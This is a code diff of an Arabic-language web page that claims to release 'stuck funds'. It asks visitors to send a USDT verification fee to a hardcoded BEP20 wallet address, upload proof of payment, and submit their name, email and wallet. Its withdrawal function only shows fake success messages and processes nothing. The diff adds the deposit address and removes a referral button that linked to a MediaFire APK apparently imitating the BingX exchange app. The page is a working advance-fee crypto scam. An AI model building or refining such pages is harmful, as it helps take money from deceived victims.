@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>إيداع التحقق - سحب الأموال العالقة</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
@@ -25,7 +25,6 @@ body{
   max-width:700px;
   margin:20px auto;
   padding:10px;
-  position:relative;
 }
 .brand{
   color:var(--accent);
@@ -40,8 +39,8 @@ body{
   box-shadow:0 10px 30px rgba(0,0,0,0.6);
   margin-bottom:20px;
 }
-h3,h4,label{
-  margin:0 0 8px 0;
+h3,h4{
+  margin:0 0 12px 0;
 }
 .muted{
   color:var(--text-muted);
@@ -105,12 +104,6 @@ input::placeholder{color:var(--text-muted);}
   color:var(--text-muted);
   font-size:13px;
 }
-.share-btn{
-  position:fixed;
-  bottom:20px;
-  left:20px;
-  z-index:1000;
-}
 hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
 </style>
 </head>
@@ -118,25 +111,35 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
 <div class="container">
   <div class="brand">أهلاً بكم بإيداع التحقق الخاص بسحب الأموال العالقة</div>
 
-  <!-- خانة التحقق -->
-  <div class="card">
-    <h3>التحقق من مبلغ الإيداع</h3>
-    <label>أدخل مبلغك للتحقق من الحد الأدنى المطلوب:</label>
-    <input id="check-amount" type="number" placeholder="أدخل المبلغ للتحقق"/>
-    <button class="btn btn-primary" onclick="checkDeposit()">تحقق</button>
-    <p id="check-msg" class="muted" style="margin-top:6px"></p>
-  </div>
-
-  <!-- خانة الإيداع -->
+  <!-- خانة إيداع التحقق -->
   <div class="card">
     <h3>إيداع التحقق</h3>
-    <label>المبلغ المراد إيداعه (USDT)</label>
-    <input id="deposit-amount" type="number" placeholder="أدخل مبلغ الإيداع"/>
+    <p class="muted">يرجى إرسال رسوم التحقق إلى عنوان المحفظة أدناه ورفع إثبات الدفع لبدء المراجعة.</p>
 
+    <div class="wallet-row">
+      <div style="flex:1">
+        <label>عنوان الإيداع (شبكة BEP20)</label>
+        <div class="wallet-address" id="deposit-address">0x3932890a5d1acb3ab036bd39ade26c47929b37e5</div>
+        <div class="muted">USDT - BEP20</div>
+      </div>
+      <div style="min-width:160px">
+        <label>نسخ العنوان</label><br>
+        <button class="btn btn-ghost" onclick="copyDepositAddress()">📋 نسخ</button>
+      </div>
+    </div>
+
+    <!-- تحقق المبلغ -->
+    <div style="margin-top:10px">
+      <label>تحقق المبلغ المطلوب</label>
+      <input id="verify-deposit-amount" type="number" placeholder="أدخل مبلغك الحالي"/>
+      <button class="btn btn-primary" style="margin-top:6px;" onclick="checkDeposit()">تحقق</button>
+      <p id="deposit-verify-msg" class="muted"></p>
+    </div>
+
+    <!-- رفع إثبات الدفع -->
     <h4>أرفق إثبات الإيداع</h4>
     <input id="proof-file" type="file" accept="image/*"/>
     <div id="proof-file-name" class="proof-name"></div>
-
     <div style="margin-top:12px">
       <button class="btn btn-primary" onclick="submitVerificationDeposit()">إرسال إثبات & طلب التحقق</button>
     </div>
@@ -144,29 +147,51 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
     <p id="verify-msg" class="muted"></p>
   </div>
 
+  <hr/>
+
   <!-- خانة السحب -->
   <div class="card">
     <h3>طلب سحب بعد التحقق</h3>
     <div class="alert-note">⚠️ قبل طلب السحب، يجب رفع صورة للأموال العالقة على المنصة</div>
 
-    <label>الاسم على المنصة</label>
-    <input id="user-name" placeholder="أدخل اسمك على المنصة"/>
+    <div class="wallet-row">
+      <div style="flex:1">
+        <label>الاسم على المنصة</label>
+        <input id="user-name" placeholder="أدخل اسمك على المنصة"/>
+      </div>
+      <div style="flex:1">
+        <label>كود الدعوة</label>
+        <input id="ref-code" placeholder="كود الدعوة"/>
+      </div>
+    </div>
 
-    <label>كود الدعوة</label>
-    <input id="ref-code" placeholder="كود الدعوة"/>
+    <div class="wallet-row">
+      <div style="flex:1">
+        <label>البريد الإلكتروني</label>
+        <input id="user-email" type="text" placeholder="البريد الإلكتروني"/>
+      </div>
+      <div style="flex:1">
+        <label>المبلغ المراد سحبه (USDT)</label>
+        <input id="withdraw-amount" type="number" placeholder="أدخل المبلغ"/>
+      </div>
+    </div>
 
-    <label>البريد الإلكتروني</label>
-    <input id="user-email" type="text" placeholder="البريد الإلكتروني"/>
+    <div class="wallet-row">
+      <div style="flex:1">
+        <label>محفظتك (USDT BEP20)</label>
+        <input id="withdraw-target-wallet" placeholder="عنوان محفظتك"/>
+      </div>
+      <div style="flex:1; display:flex; flex-direction:column; justify-content:flex-end;">
+        <label>نسخ العنوان</label>
+        <button class="btn btn-ghost" style="margin-top:4px;" onclick="copyWallet()">📋 نسخ</button>
+      </div>
+    </div>
 
-    <label>المبلغ المراد سحبه (USDT)</label>
-    <input id="withdraw-amount" type="number" placeholder="المبلغ"/>
-
-    <label>ضع محفظتك هنا (USDT BEP20)</label>
-    <input id="withdraw-target-wallet" placeholder="عنوان محفظتك"/>
-
-    <label>رفع صورة الأموال العالقة</label>
-    <input id="locked-funds-file" type="file" accept="image/*"/>
-    <div id="locked-file-name" class="proof-name"></div>
+    <div style="margin-top:10px">
+      <label>رفع صورة الأموال العالقة</label>
+      <input id="locked-funds-file" type="file" accept="image/*"/>
+      <div id="locked-file-name" class="proof-name"></div>
+    </div>
 
     <div style="margin-top:10px">
       <button class="btn btn-primary" onclick="requestWithdraw()">طلب السحب</button>
@@ -180,13 +205,6 @@ hr{border:none;border-top:1px solid rgba(255,255,255,0.2);margin:20px 0;}
   </div>
 </div>
 
-<!-- زر مشاركة التطبيق -->
-<div class="share-btn">
-  <button class="btn btn-primary" onclick="shareApp()">
-    📤 شارك التطبيق مع أصدقائك
-  </button>
-</div>
-
 <script>
 document.getElementById('proof-file').addEventListener('change', e=>{
   const f = e.target.files[0];
@@ -197,46 +215,50 @@ document.getElementById('locked-funds-file').addEventListener('change', e=>{
   document.getElementById('locked-file-name').innerText = f ? `ملف مرفوع: ${f.name}` : '';
 });
 
+function copyDepositAddress(){
+  const addr = document.getElementById('deposit-address').innerText;
+  if(addr) alert('تم نسخ عنوان الإيداع');
+}
+
 function checkDeposit(){
-  const amt = parseFloat(document.getElementById('check-amount').value);
-  let msg='';
-  if(isNaN(amt) || amt<=0){ msg='يرجى إدخال مبلغ صالح'; }
-  else if(amt<=500){ msg='يجب الإيداع: 100 USDT'; }
-  else if(amt<=1000){ msg='يجب الإيداع: 200 USDT'; }
-  else if(amt<=2000){ msg='يجب الإيداع: 300 USDT'; }
-  else{ msg='يرجى التواصل مع الدعم'; }
-  document.getElementById('check-msg').innerText = msg;
+  const amt = parseFloat(document.getElementById('verify-deposit-amount').value);
+  const msg = document.getElementById('deposit-verify-msg');
+  if(isNaN(amt) || amt<=0){ msg.innerText = 'يرجى إدخال مبلغ صالح'; return; }
+  if(amt < 500) msg.innerText = 'يجب الإيداع: 100 USDT';
+  else if(amt >= 1000 && amt < 2000) msg.innerText = 'يجب الإيداع: 200 USDT';
+  else if(amt >= 2000) msg.innerText = 'يجب الإيداع: 300 USDT';
+  else msg.innerText = 'المبلغ مقبول';
 }
 
 function submitVerificationDeposit(){
   const file = document.getElementById('proof-file').files[0];
-  const amount = parseFloat(document.getElementById('deposit-amount').value);
-  if(isNaN(amount) || amount <= 0){ alert('يرجى إدخال مبلغ الإيداع'); return; }
+  const amt = parseFloat(document.getElementById('verify-deposit-amount').value);
+  if(isNaN(amt) || amt <=0){ alert('أدخل المبلغ'); return; }
   if(!file){ alert('يرجى إرفاق صورة إثبات الدفع'); return; }
-  document.getElementById('verify-msg').innerText = `تم إرسال طلب التحقق لمبلغ ${amount} USDT — قيد المراجعة`;
-  alert(`تم إرسال طلب التحقق لمبلغ ${amount} USDT بنجاح، قيد المراجعة.`);
+  document.getElementById('verify-msg').innerText = `تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`;
+  alert(`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`);
+}
+
+function copyWallet(){
+  const wallet = document.getElementById('withdraw-target-wallet').value;
+  if(wallet) navigator.clipboard.writeText(wallet).then(()=> alert('تم نسخ عنوان المحفظة'));
 }
 
 function requestWithdraw(){
   const name = document.getElementById('user-name').value.trim();
-  const code = document.getElementById('ref-code').value.trim();
+  const ref = document.getElementById('ref-code').value.trim();
   const email = document.getElementById('user-email').value.trim();
   const amt = parseFloat(document.getElementById('withdraw-amount').value);
   const wallet = document.getElementById('withdraw-target-wallet').value.trim();
   const lockedFile = document.getElementById('locked-funds-file').files[0];
 
-  if(!name || !code || !email){ alert('يرجى ملء جميع البيانات الشخصية'); return; }
-  if(isNaN(amt) || amt<=0){ alert('أدخل مبلغ سحب صالح'); return; }
-  if(!wallet){ alert('أدخل عنوان محفظتك لاستلام السحب'); return; }
-  if(!lockedFile){ alert('يرجى رفع صورة للأموال العالقة قبل السحب'); return; }
+  if(!name || !ref || !email){ alert('يرجى تعبئة جميع البيانات'); return; }
+  if(isNaN(amt) || amt <=0){ alert('أدخل مبلغ سحب صالح'); return; }
+  if(!wallet){ alert('أدخل عنوان محفظتك'); return; }
+  if(!lockedFile){ alert('يرجى رفع صورة الأموال العالقة'); return; }
 
-  document.getElementById('withdraw-msg').innerText = 'تم تقديم طلب سحب الأموال بنجاح';
-  alert(`تم تقديم طلب سحب الأموال بمبلغ ${amt} USDT. سيتم مراجعة طلبك.`);
-}
-
-function shareApp(){
-  window.open('https://www.mediafire.com/file/7fi3cvqggr9d2fg/BingX+Pro+V2.0.apk/file', '_blank');
-  alert('شارك رابط التطبيق مع أصدقائك. كل شخص ينضم يخصم لك 10 USDT من الإيداع.');
+  document.getElementById('withdraw-msg').innerText = `تم تقديم طلب سحب ${amt} USDT بنجاح. سيتم التواصل معك عبر البريد الإلكتروني.`;
+  alert(`تم تقديم طلب السحب بنجاح بمبلغ ${amt} USDT.`);
 }
 </script>
 </body>
